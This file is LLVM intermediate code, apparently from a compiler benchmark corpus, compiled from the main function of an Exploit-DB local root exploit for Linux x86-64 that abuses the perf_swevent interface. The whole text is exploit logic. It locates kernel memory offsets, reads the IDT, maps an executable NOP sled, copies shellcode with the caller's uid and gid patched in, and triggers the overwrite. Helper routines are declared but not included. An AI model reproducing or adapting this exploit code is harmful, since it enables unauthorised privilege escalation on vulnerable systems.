; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_26131.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_26131.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.idt = type { i32 }

@BASE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [13 x i8] c"Searchin...\0A\00", align 1
@BASE_JUMP = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"Can't find overwrite\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"detected CONFIG_JUMP_LABEL\0A\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"perf_swevent_enabled is at 0x%lx\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"IDT at 0x%lx\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"remainder %d\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"Using interrupt %d\0A\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"Shellcode at %p\0A\00", align 1
@KSIZE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [7 x i8] c"mmap()\00", align 1
@__sc_next = common dso_local global i32 0, align 4
@__sc_start = common dso_local global i32 0, align 4
@sc = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@morte = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [19 x i8] c"Triggering sploit\0A\00", align 1
@_fd = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i32*], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.idt, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @BASE, align 4
  store i32 %15, i32* %10, align 4
  store i32 4, i32* %13, align 4
  store i32 4, i32* %14, align 4
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* @BASE, align 4
  %18 = call i32* @map_mem(i32 %17)
  %19 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 0
  store i32* %18, i32** %19, align 16
  %20 = load i32, i32* @BASE_JUMP, align 4
  %21 = call i32* @map_mem(i32 %20)
  %22 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 1
  store i32* %21, i32** %22, align 8
  %23 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 1
  %24 = load i32*, i32** %23, align 8
  %25 = load i32, i32* @SIZE, align 4
  %26 = call i32 @memset(i32* %24, i32 105, i32 %25)
  store i32 -1, i32* %9, align 4
  %27 = load i32, i32* %9, align 4
  %28 = call i8* @perf_open(i32 %27)
  %29 = ptrtoint i8* %28 to i32
  store i32 %29, i32* %7, align 4
  %30 = load i32, i32* %7, align 4
  %31 = call i32 @close(i32 %30)
  %32 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 0
  %33 = load i32*, i32** %32, align 16
  %34 = call i32 @find_mem(i32* %33, i32 255)
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %8, align 4
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %37, label %48

37:                                               ; preds = %2
  %38 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 1
  %39 = load i32*, i32** %38, align 8
  %40 = call i32 @find_mem(i32* %39, i32 104)
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %45

43:                                               ; preds = %37
  %44 = call i32 (i32, i8*, ...) @errx(i32 1, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  br label %45

45:                                               ; preds = %43, %37
  store i32 24, i32* %13, align 4
  %46 = load i32, i32* @BASE_JUMP, align 4
  store i32 %46, i32* %10, align 4
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0))
  br label %48

48:                                               ; preds = %45, %2
  %49 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 0
  %50 = load i32*, i32** %49, align 16
  %51 = load i32, i32* @SIZE, align 4
  %52 = call i32 @munmap(i32* %50, i32 %51)
  %53 = getelementptr inbounds [2 x i32*], [2 x i32*]* %6, i64 0, i64 1
  %54 = load i32*, i32** %53, align 8
  %55 = load i32, i32* @SIZE, align 4
  %56 = call i32 @munmap(i32* %54, i32 %55)
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %10, align 4
  %59 = add nsw i32 %58, %57
  store i32 %59, i32* %10, align 4
  %60 = load i32, i32* %9, align 4
  %61 = load i32, i32* %13, align 4
  %62 = mul nsw i32 %60, %61
  %63 = load i32, i32* %10, align 4
  %64 = sub nsw i32 %63, %62
  store i32 %64, i32* %10, align 4
  %65 = load i32, i32* %10, align 4
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i32 %65)
  call void asm "sidt $0", "=*m,~{dirflag},~{fpsr},~{flags}"(%struct.idt* %11) #3, !srcloc !2
  %67 = getelementptr inbounds %struct.idt, %struct.idt* %11, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i32 %68)
  %70 = load i32, i32* %10, align 4
  %71 = getelementptr inbounds %struct.idt, %struct.idt* %11, i32 0, i32 0
  %72 = load i32, i32* %71, align 4
  %73 = sub nsw i32 %70, %72
  store i32 %73, i32* %9, align 4
  %74 = load i32, i32* %9, align 4
  %75 = sub nsw i32 %74, 8
  store i32 %75, i32* %9, align 4
  %76 = load i32, i32* %9, align 4
  %77 = load i32, i32* %13, align 4
  %78 = srem i32 %76, %77
  switch i32 %78, label %82 [
    i32 0, label %79
    i32 8, label %80
    i32 16, label %81
  ]

79:                                               ; preds = %48
  store i32 0, i32* %14, align 4
  br label %87

80:                                               ; preds = %48
  store i32 128, i32* %14, align 4
  br label %87

81:                                               ; preds = %48
  store i32 4, i32* %14, align 4
  br label %87

82:                                               ; preds = %48
  %83 = load i32, i32* %9, align 4
  %84 = load i32, i32* %13, align 4
  %85 = srem i32 %83, %84
  %86 = call i32 (i32, i8*, ...) @errx(i32 1, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i32 %85)
  br label %87

87:                                               ; preds = %82, %81, %80, %79
  %88 = load i32, i32* %14, align 4
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i32 %88)
  %90 = load i32, i32* %14, align 4
  %91 = mul nsw i32 16, %90
  %92 = load i32, i32* %9, align 4
  %93 = sub nsw i32 %92, %91
  store i32 %93, i32* %9, align 4
  %94 = load i32, i32* %9, align 4
  %95 = load i32, i32* %13, align 4
  %96 = srem i32 %94, %95
  %97 = icmp eq i32 %96, 0
  %98 = zext i1 %97 to i32
  %99 = call i32 @assert(i32 %98)
  %100 = load i32, i32* %13, align 4
  %101 = load i32, i32* %9, align 4
  %102 = sdiv i32 %101, %100
  store i32 %102, i32* %9, align 4
  %103 = load i32, i32* %9, align 4
  %104 = sub nsw i32 0, %103
  store i32 %104, i32* %9, align 4
  %105 = getelementptr inbounds %struct.idt, %struct.idt* %11, i32 0, i32 0
  %106 = load i32, i32* %105, align 4
  %107 = and i32 %106, -16777216
  %108 = zext i32 %107 to i64
  %109 = inttoptr i64 %108 to i32*
  store i32* %109, i32** %12, align 8
  %110 = load i32*, i32** %12, align 8
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0), i32* %110)
  %112 = load i32*, i32** %12, align 8
  %113 = load i32, i32* @KSIZE, align 4
  %114 = load i32, i32* @PROT_READ, align 4
  %115 = load i32, i32* @PROT_WRITE, align 4
  %116 = or i32 %114, %115
  %117 = load i32, i32* @PROT_EXEC, align 4
  %118 = or i32 %116, %117
  %119 = load i32, i32* @MAP_PRIVATE, align 4
  %120 = load i32, i32* @MAP_ANONYMOUS, align 4
  %121 = or i32 %119, %120
  %122 = load i32, i32* @MAP_FIXED, align 4
  %123 = or i32 %121, %122
  %124 = call i64 @mmap(i32* %112, i32 %113, i32 %118, i32 %123, i32 -1, i32 0)
  %125 = load i64, i64* @MAP_FAILED, align 8
  %126 = icmp eq i64 %124, %125
  br i1 %126, label %127, label %129

127:                                              ; preds = %87
  %128 = call i32 @err(i32 1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  br label %129

129:                                              ; preds = %127, %87
  %130 = load i32*, i32** %12, align 8
  %131 = load i32, i32* @KSIZE, align 4
  %132 = call i32 @memset(i32* %130, i32 144, i32 %131)
  %133 = load i32, i32* @KSIZE, align 4
  %134 = sub nsw i32 %133, 1024
  %135 = load i32*, i32** %12, align 8
  %136 = sext i32 %134 to i64
  %137 = getelementptr inbounds i32, i32* %135, i64 %136
  store i32* %137, i32** %12, align 8
  %138 = load i32, i32* @__sc_next, align 4
  %139 = load i32, i32* @__sc_start, align 4
  %140 = sub nsw i32 %138, %139
  store i32 %140, i32* %8, align 4
  %141 = load i32*, i32** %12, align 8
  %142 = load i32, i32* @__sc_start, align 4
  %143 = load i32, i32* %8, align 4
  %144 = call i32 @memcpy(i32* %141, i32 %142, i32 %143)
  %145 = load i32, i32* %8, align 4
  %146 = load i32*, i32** %12, align 8
  %147 = sext i32 %145 to i64
  %148 = getelementptr inbounds i32, i32* %146, i64 %147
  store i32* %148, i32** %12, align 8
  %149 = load i32*, i32** %12, align 8
  %150 = load i32, i32* @sc, align 4
  %151 = call i32 @memcpy(i32* %149, i32 %150, i32 900)
  %152 = load i32*, i32** %12, align 8
  %153 = call i32 @TMP(i32 1)
  %154 = call i32 (...) @getuid()
  %155 = call i32 @sc_replace(i32* %152, i32 %153, i32 %154)
  %156 = load i32*, i32** %12, align 8
  %157 = call i32 @TMP(i32 2)
  %158 = call i32 (...) @getgid()
  %159 = call i32 @sc_replace(i32* %156, i32 %157, i32 %158)
  %160 = load i32, i32* @SIGALRM, align 4
  %161 = load i32, i32* @morte, align 4
  %162 = call i32 @signal(i32 %160, i32 %161)
  %163 = call i32 @alarm(i32 2)
  %164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %165 = load i32, i32* %9, align 4
  %166 = call i8* @perf_open(i32 %165)
  store i8* %166, i8** @_fd, align 8
  %167 = load i32, i32* %14, align 4
  %168 = call i32 @trigger(i32 %167)
  %169 = call i32 @exit(i32 0) #4
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32* @map_mem(i32) #1

declare dso_local i32 @memset(i32*, i32, i32) #1

declare dso_local i8* @perf_open(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @find_mem(i32*, i32) #1

declare dso_local i32 @errx(i32, i8*, ...) #1

declare dso_local i32 @munmap(i32*, i32) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i64 @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @memcpy(i32*, i32, i32) #1

declare dso_local i32 @sc_replace(i32*, i32, i32) #1

declare dso_local i32 @TMP(i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @trigger(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 1670}
